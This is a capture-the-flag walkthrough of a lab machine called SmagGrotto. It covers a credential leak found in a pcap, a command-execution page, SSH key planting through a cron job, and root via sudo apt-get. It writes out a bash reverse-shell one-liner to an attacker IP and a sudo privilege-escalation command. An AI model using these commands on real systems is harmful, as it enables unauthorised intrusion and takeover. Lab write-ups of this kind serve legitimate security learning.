SmagGrotto

Target IP: 10.10.142.123

Follow the yellow brick road.

Scanning


There are two TCP ports open on the target machine: SSH and HTTP. I will start enumeration with HTTP on port 80.

Enumeration

Port 80: HTTP

The webpage above is displayed for this application. The source-code does not contain anything useful either.


Doing a directory search against this port shows the entries above.


The webpage above is shown for /mail. There is an interesting Wireshark capture file called dHJhY2Uy.pcap as shown above. I downloaded this file on my machine.


The Wireshark capture file contains juicy details especially the fourth HTTP packet. These details are shown in the image above. There is another VHOST called development.smag.thm. And the POST form data contains the credential helpdesk:cH4nG3M3_n0w.


I made changes to my /etc/hosts file and appended the hosts as shown above. Now my /etc/hosts contains the entry above.


And browsing to http://development.smag.thm shows the webpage above. Since the POST was sent to /login.php, I used the credentials above at /login and gained access!


It looks like I can perform command execution. But nothing gets displayed... Will this accept our reverse shell connection?

Exploitation


And bingo! I started a listener on port 8444 and sent the command bash -c '/bin/bash -i >& /dev/tcp/10.14.55.153/8444 0>&1' for the reverse shell. Now I have a reverse shell connection from the target machine on my machine at port 8444.

Privilege Escalation


There is an interesting cronjob that makes a copy of the jake_id_rsa.pub.backup to /authorized_keys. And I have write privileges over the /opt/.backups/jake_id_rsa.pub.backup. I had to revert the box as I lost my reverse shell connection and the connection was not stable. New IP is 10.10.234.191.


For lateral movement, I replaced the jake_id_rsa.pub.backup with my own SSH public key. After waiting for some time, I used SSH as jake to gain access to the target machine. I did not need to enter password either. Now I escalated my privileges to the user jake.


Running sudo -l shows /usr/bin/apt-get binary can be used for PE to obtain root privileges.


And now I have a root shell. The command I used for PE is sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash. GG.
